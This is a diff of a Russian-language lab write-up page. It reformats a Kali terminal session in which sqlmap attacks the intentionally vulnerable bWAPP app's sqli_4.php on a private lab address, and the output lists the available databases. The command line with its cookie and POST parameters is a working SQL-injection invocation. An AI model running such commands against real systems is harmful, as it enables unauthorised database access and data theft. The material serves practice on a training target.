@@ -9,26 +9,20 @@ sidebar_position: 1
 
 
 В прошлый раз у меня была ошибка, поэтому исправляемся и переписываем запрос для sqlmap
-
+```bash
 ┌──(kali㉿kali)-[~]
+└─$ sqlmap -u http://192.168.42.132/bWAPP/sqli_4.php --cookie="PHPSESSID=68d0c36b54a0976f21daa4c57c4e57e2; security_level=0" --data="title=Iron+Man&action=search" -p title --dbs
 
-└─$ sqlmap -u http://192.168.42.132/bWAPP/sqli\_4.php --cookie="PHPSESSID=68d0c36b54a0976f21daa4c57c4e57e2; security\_level=0" --data="title=Iron+Man&action=search" -p title --dbs
-
-\_\_\_
-
-\_\_H\_\_
-
-\_\_\_ \_\_\_["]\_\_\_\_\_ \_\_\_ \_\_\_ \{1.9.10#stable\}
-
-|\_ -| . ['] | .'| . |
-
-|\_\_\_|\_ [.]\_|\_|\_|\_\_,| \_|
-
-|\_|V... |\_| https://sqlmap.org
+        ___
+       __H__
+ ___ ___["]_____ ___ ___ {1.9.10#stable}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_| https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[\*] starting @ 07:07:04 /2025-11-12/
+[*] starting @ 07:07:04 /2025-11-12/
 
 [07:07:04] [INFO] testing connection to the target URL
 
@@ -62,7 +56,7 @@ sidebar_position: 1
 
 [07:07:05] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
 
-[07:07:05] [INFO] testing 'Oracle stacked queries (DBMS\_PIPE.RECEIVE\_MESSAGE - comment)'
+[07:07:05] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
 
 [07:07:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
 
@@ -140,18 +134,18 @@ back-end DBMS: MySQL >= 5.0.12
 
 available databases [4]:
 
-[\*] bWAPP
+[*] bWAPP
 
-[\*] drupageddon
+[*] drupageddon
 
-[\*] information\_schema
+[*] information_schema
 
-[\*] mysql
+[*] mysql
 
 [07:08:47] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.42.132'
 
-[\*] ending @ 07:08:47 /2025-11-12/
+[*] ending @ 07:08:47 /2025-11-12/
 
 ┌──(kali㉿kali)-[~]
-
 └─$
+```
